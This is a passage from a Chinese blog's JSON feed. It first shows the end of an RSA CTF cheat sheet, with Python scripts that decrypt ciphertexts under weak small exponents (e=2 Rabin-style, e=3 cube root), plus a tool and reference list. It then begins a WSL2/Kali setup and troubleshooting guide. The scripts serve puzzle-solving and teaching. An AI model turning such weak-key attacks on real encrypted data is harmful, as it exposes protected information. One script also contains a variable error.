punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    m_hex <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>c_hex <span class=\"token operator\">+</span> gmpy2<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>N_hex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m_hex<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>a2b_hex<span class=\"token punctuation\">(</span>m_hex<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">except</span> binascii<span class=\"token punctuation\">.</span>Error <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"位数非偶数，跳过...\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><h1 id=\"e2\"><a class=\"anchor\" href=\"#e2\">#</a> e=2</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>PublicKey <span class=\"token keyword\">import</span> RSA</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 读取公钥参数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./tmp/pubkey.pem'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    key <span class=\"token operator\">=</span> RSA<span class=\"token punctuation\">.</span>importKey<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    N <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>n</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    e <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>e</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">275127860351348928173285174381581152299</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">319576316814478949870590164193048041239</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./tmp/flag.enc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    cipher <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    cipher <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>atoi<span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> base<span class=\"token operator\">=</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\"># print cipher</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 计算 yp 和 yq</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>yp <span class=\"token operator\">=</span> gmpy<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>yq <span class=\"token operator\">=</span> gmpy<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 计算 mp 和 mq</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>mp <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>mq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 计算 a,b,c,d</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>yp <span class=\"token operator\">*</span> p <span class=\"token operator\">*</span> mq <span class=\"token operator\">+</span> yq <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> mp<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> N</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>b <span class=\"token operator\">=</span> N <span class=\"token operator\">-</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>yp <span class=\"token operator\">*</span> p <span class=\"token operator\">*</span> mq <span class=\"token operator\">-</span> yq <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> mp<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> N</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>d <span class=\"token operator\">=</span> N <span class=\"token operator\">-</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    s <span class=\"token operator\">=</span> <span class=\"token string\">'%x'</span> <span class=\"token operator\">%</span> i</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        s <span class=\"token operator\">=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">+</span> s</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">print</span> s<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"e3\"><a class=\"anchor\" href=\"#e3\">#</a> e=3</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>PublicKey <span class=\"token keyword\">import</span> RSA</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>public_key <span class=\"token operator\">=</span> <span class=\"token string\">\"./tmp/pubkey.pem\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>cipher_file <span class=\"token operator\">=</span> <span class=\"token string\">\"./tmp/flag.enc\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#读入公钥</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>public_key<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    key <span class=\"token operator\">=</span> RSA<span class=\"token punctuation\">.</span>importKey<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    n <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>n</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    e <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>e</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#读入密文</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>cipher_file<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    cipher <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"hex\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    cipher <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">#print(cipher)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#破解密文</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>cipher<span class=\"token operator\">+</span>i<span class=\"token operator\">*</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            flag_bin <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>cipher<span class=\"token operator\">+</span>x<span class=\"token operator\">*</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            flag <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>flag_bin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"hex\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_flag_for</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">xrange</span><span class=\"token punctuation\">(</span><span class=\"token number\">118600000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118720000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>cipher<span class=\"token operator\">+</span>x<span class=\"token operator\">*</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            flag_bin <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>cipher<span class=\"token operator\">+</span>x<span class=\"token operator\">*</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            flag <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>flag_bin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"hex\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">break</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    get_flag_for<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token comment\">#get_flag()</span></pre></td></tr></table></figure><h1 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2l1cy9yc2F0b29s\">rsatool</span></li>\n<li>[factordb](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mYWN0b3JkYi5jb20=\">http://www.factordb.com </span>)</li>\n<li>gmpy2/pycrypto 库</li>\n<li>yafu</li>\n<li>openssl</li>\n</ul>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjMwMzE2L2FydGljbGUvZGV0YWlscy8xMDU5MDQwMjA=\">个人收集的 RSA 常用脚本</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vUDIwMTUyMTQ0MDAwMS9wLzExNDM5MzQ0Lmh0bWw=\">常见的 RSA 套路脚本</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlcmVuZGlwaXR5MTEzMC9hcnRpY2xlL2RldGFpbHMvMTIwMTU0NTM0\">共模攻击原理详解</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OS9hcnRpY2xlL2RldGFpbHMvMTA4NDczOTg0P3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjEmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUNUUkxJU1QlN0VkZWZhdWx0LTEubm9fc2VhcmNoX2xpbmsmYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMS5ub19zZWFyY2hfbGluaw==\">gmpy2 常见函数使用</span></p>\n",
            "tags": [
                "业余爱好"
            ]
        },
        {
            "id": "http://example.com/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/",
            "url": "http://example.com/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/",
            "title": "wsl2安装使用及debug心得",
            "date_published": "2021-11-28T14:55:56.006Z",
            "content_html": "<p>分享一下我对 wsl2 的看法及使用心得，顺便记录在安装 wsl2 时我的心路历程</p>\n<p>(遇到的问题及解决方法)</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<h1 id=\"为什么选择wsl2\"><a class=\"anchor\" href=\"#为什么选择wsl2\">#</a> 为什么选择 WSL2?</h1>\n<p>很多人接触到 <code>wsl</code>  时都有一种陌生感和抵触感，因为我们常常会选择 <code>VM</code> ，认为老牌产品更靠谱。</p>\n<p>的确，但是随着系统的发展，我们去不断尝试和接触新的产品，其实也未尝不是一件好事，正比如今天说的 <code>wsl</code> ，它大大简化了虚拟机安装繁琐的过程，以及每次使用的步骤，大大提高了使用效率，节约了空间，方便转移甚至移植到其他机器，同时 <code>wsl</code>  有着很高的自主选择权，让用户可以自己定义功能等等，从上面角度来说，我认为是优于传统 <code>VM</code>  的。</p>\n<p>尽管 <code>wsl</code>  也有着不少缺点，比如操作容错率小，自定义时想实现更高的功能会稍有复杂，debug 贴少于 <code>VM</code> （这点劝退了很多人）、或者说很多人入门时装好了 <code>VM</code>  懒得再折腾等等。</p>\n<p>对于有想法且不嫌麻烦折腾一次的人，我的意见是 wsl 绝对物超所值，配置好后能带来极大的便利，你值得拥有，如果对 <code>wsl</code>  感兴趣或者有什么疑问，欢迎来评论区交流！</p>\n<p>至于我，为什么选择 <code>wsl</code> ？恐怕是我没有深度依赖于 <code>VM</code> ，并且厌倦了繁琐的 <code>VM</code>  使用方法（其实还好，是我懒），且本人爱折腾。</p>\n<p>万幸的是， <code>wsl</code>  目前带给了我很好的体验感，并且学到了很多不一样的知识，所以我认为写本帖其实很有意义。</p>\n<h1 id=\"kali-wsl\"><a class=\"anchor\" href=\"#kali-wsl\">#</a> kali-wsl</h1>\n<p>很多人都刚开始接触 kali-wsl 可能都会发现，这个 kali 非常不完整，很多工具都没有，这是因为这个 kali 并不是完整版的，但其实我们只需一个命令即可让其变成完整版，让其变得可以运行几乎所有的 kali 工具包。</p>\n<p>wsl 安装过程可以参考下面这个帖子，比较靠谱。</p>\n<p>在 <code>安装完整kali</code>  一步时，注意可以选择不同的版本，请根据需求谨慎选择！</p>\n<p>具体参见：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL2thbGktbGludXgvbWV0YXBhY2thZ2VzLmh0bWw=\">Kali Linux 高级教程：元数据包 “工具子集” 介绍与安装</span></p>\n<div class=\"note info\">\n<p>值得一提的是，换源的时候不是很好操作，如果要调整光标位置，请先按一下 <code>del</code> ，再操控方向，否则你试试就懂了，两下 d 删除一行。</p>\n<p>如果能复制尽量复制，打错了或者复制错了如果不会删除建议关掉重开。</p>\n<p>按一下 <code>esc</code> ，输入 <code>:q</code>  直接退出， <code>:wq</code>  保存退出。</p>\n<p>剩下的直接参考 csdn 上面贴子。</p>\n</div>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMwL2FydGljbGUvZGV0YWlscy8xMDg2NzU5MTU=\">wsl2-kali 基础配置</span></p>\n<p><strong>重点来了</strong>，默认的 wsl2 的存储位置在 c 盘，如果分配空间过大或者使用过大的话，很容易导致爆盘，所以建议配置完基础后进行移盘操作，保证好不要出岔子！</p>\n<p>（血泪教训，我就爆过盘！！！）</p>\n<p>操作如下：</p>\n<ul>\n<li><strong>查看 WSL 分发版本</strong></li>\n</ul>\n<p>在 <code>Windows PowerShell</code>  中输入如下命令:</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wsl <span class=\"token operator\">-</span>l <span class=\"token operator\">--</span>all <span class=\"token operator\">-</span>v</pre></td></tr></table></figure><ul>\n<li><strong>导出分发版为 tar 文件到 d 盘</strong></li>\n</ul>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wsl <span class=\"token operator\">--</span>export kali<span class=\"token operator\">-</span>linux d:\\kali<span class=\"token operator\">-</span>linux<span class=\"token punctuation\">.</span>tar</pre></td></tr></table></figure><ul>\n<li><strong>注销当前分发版</strong></li>\n</ul>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wsl <span class=\"token operator\">--</span>unregister kali<span class=\"token operator\">-</span>linux</pre></td></tr></table></figure><ul>\n<li><strong>重新导入并安装 WSL 在 d:\\kali-linux</strong></li>\n</ul>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wsl <span class=\"token operator\">--</span>import kali<span class=\"token operator\">-</span>linux d:\\kali<span class=\"token operator\">-</span>linux d:\\kali<span class=\"token operator\">-</span>linux<span class=\"token punctuation\">.</span>tar <span class=\"token operator\">--</span>version 2</pre></td></tr></table></figure><ul>\n<li><strong>删除 tar 文件 (不删也行)</strong></li>\n</ul>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">del</span> d:\\kali<span class=\"token operator\">-</span>linux<span class=\"token punctuation\">.</span>tar</pre></td></tr></table></figure><p>wsl-ubuntu 参考下面这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGw1NDI0NzU3MzYvcC8xNDg1NTg2My5odG1s\">WSL 修改默认安装目录到其他盘</span></p>\n<div class=\"note info\">\n<p>个人建议早点移盘，不然会后悔的，配置变量多了很麻烦</p>\n</div>\n<p>一切安装好后，可以查看目录是否有自己需要的软件，下面附一个软件功能表：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHprYWxpc2x3L3AvMTI4NDU3MTQuaHRtbA==\">kali 各工具使用介绍</span></p>\n<p><strong>kali docker 安装</strong>：由于 kali 佬可能会用到 <code>docker</code> ，下面加一个靠谱的安装教程，亲测好用：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODMyODM3L2FydGljbGUvZGV0YWlscy8xMDM5NDgzMTQ=\">kali 安装 docker</span></p>\n<p>其他软件自己搜就好，此时的 kali 与正常的 kali 图像化界面已经大同小异，直接调用命令行就可。</p>\n<h1 id=\"kali-快速debug分享\"><a class=\"anchor\" href=\"#kali-快速debug分享\">#</a> kali 快速 debug 分享</h1>\n<p>下面分享一下我遇到的 bug 和解决方法，帮助新手减少点难度，其他 bug 可以上百度搜，时至今日基本都能解决（有很多大佬）</p>\n<p><strong>1. 找不到 wsl</strong></p>\n<p>在控制面板 &gt; 程序 &gt; 启动或关闭 <code>Windows</code>  功能处，打开适用于 <code>Linux</code>  的 <code>Windows</code>  子系统功能。</p>\n<p><strong>2. 参考的对象类型不支持尝试的操作</strong></p>\n<ul>\n<li>下载此软件：</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucHJveGlmaWVyLmNvbS90bXAvVGVzdDIwMjAwMjI4L05vTHNwLmV4ZQ==\">www.proxifier.com/tmp/Test20200228/NoLsp.exe</span></p>\n<ul>\n<li>管理员身份运行 CMD 输入：</li>\n</ul>\n<pre><code class=\"language-cmd\">NoLsp.exe C:\\windows\\system32\\wsl.exe\n</code></pre>\n<p>请自行注意 <code>NoLsp.exe</code>  程序的位置，以及你的 <code>wsl.exe</code>  位置。</p>\n<p>方法摘自<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNTEzOTI0MTE=\">参考的对象类型不支持尝试的操作</span></p>\n<p><strong>3. 修改数据时出现问题</strong></p>\n<p>在汉化和换源时出现问题，如果还没保存， <code>esc</code>  后 <code>:q</code>  重新进去修改就行</p>\n<p>否则最简单的就是卸载重装（我经历了四次）</p>\n<h1 id=\"gui界面安装可选\"><a class=\"anchor\" href=\"#gui界面安装可选\">#</a> GUI 界面安装（可选）</h1>\n<p>其实我是没准备写这方面的，但总是有人嫌没有界面化系统所以觉得 <code>wsl</code>  不如 <code>VM</code> ，其实我想说的是：人不行还非要怪路不平～～人家有你也不想装！</p>\n<p>由于本人没有安装 GUI 的需求，个人也认为没必要，实在是没有代码行好用，所以只提供几个帖子，但在我反复比对后，发现其实都大同小异。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2wxNDQ3MzIwMjI5L2FydGljbGUvZGV0YWlscy8xMDgyMTA3NjA/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NjEuMSZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50X3QwLm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMS5ub19zZWFyY2hfbGluayZhbXA7ZGVwdGhfMS11dG1fc291cmNlPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnRfdDAubm9uZS10YXNrLWJsb2ctMiU3RWRlZmF1bHQlN0VDVFJMSVNUJTdFZGVmYXVsdC0xLm5vX3NlYXJjaF9saW5r\">WSL2（win10 